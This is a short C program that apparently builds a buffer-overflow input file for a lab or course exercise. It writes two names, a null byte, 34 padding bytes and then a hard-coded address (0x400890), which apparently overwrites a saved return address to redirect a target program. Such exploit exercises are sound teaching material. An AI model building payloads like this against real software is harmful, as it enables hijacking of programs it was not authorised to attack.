#include <stdio.h>
#include <string.h>
#include <stdlib.h>

FILE *psFILE;
int main(void)
{
    int i;
    unsigned long ulData = 0x400890;
    psFILE = fopen("dataB", "w");
    fprintf(psFILE, "Ariel & Grace");
    for(i = 0; i < 1; i++)
    {
        fprintf(psFILE, "%c", '\0');
    }
    for (i = 0; i < 34; i++)
    {
        fprintf(psFILE, "%c", 'a');
    }
    fwrite(&ulData, sizeof(unsigned long), 1, psFILE);
    fclose(psFILE);
    return 0;
}